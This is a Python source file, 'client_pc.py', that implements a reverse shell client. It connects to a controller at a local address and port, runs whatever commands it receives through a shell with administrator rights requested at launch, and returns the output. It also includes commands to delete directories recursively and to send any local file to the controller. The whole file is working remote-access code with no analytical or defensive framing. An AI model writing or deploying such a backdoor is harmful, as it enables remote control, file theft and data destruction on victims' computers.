# client_pc.py

import socket
import subprocess
import time
import os
import shutil
import pyuac


def main():
    host = "127.0.0.1"
    port = 4886

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def common():
        op = subprocess.Popen(data.decode(), shell=True,
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE, )

        report = op.stdout.read()
        report_error = op.stderr.read()

        print(report.decode())
        print(report_error.decode())

        s.sendall(report)
        s.sendall(report_error)

    while True:
        try:
            s.connect((host, port))
            print("Established connection to: ", str(host) + ":" + str(port))
            break
        except Exception:
            print("Connection refused, retrying...")
            time.sleep(2)

    while True:
        data = s.recv(4294967296)
        extracted = data.decode()
        print("Executed:", extracted)

        if extracted[:2] == "cd":
            try:
                os.chdir(extracted[3:])
                s.sendall(("Directory changed: " + extracted).encode())
            except Exception:
                print("The system cannot find the path specified.")
                s.sendall("The system cannot find the path specified.".encode())

        elif extracted[:5] == "mkdir":
            try:
                os.mkdir(extracted[6:])
                s.sendall(("Directory made: " + extracted).encode())
            except Exception:
                print("A subdirectory or file " + extracted[6:] + " already exists.")
                s.sendall("A subdirectory or file " + extracted[6:] + " already exists.")

        elif extracted[:6] == "deldir":
            try:
                shutil.rmtree(extracted[7:])
                s.sendall(("Directory deleted: " + extracted).encode())
            except Exception:
                print("The system cannot find the subdirectory specified.")
                s.sendall("The system cannot find the subdirectory specified.")
               
        elif extracted[:8] == "download":
            try:
                f = open(extracted[9:], "rb")
                data = f.read()
                print("File uploaded.")
                s.sendall(data)
                f.close()
            except:
                print("Unable to send data.")
                s.sendall("Unable to send data.".encode())

        else:
            common()


if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        pyuac.runAsAdmin()
    else:
        main()
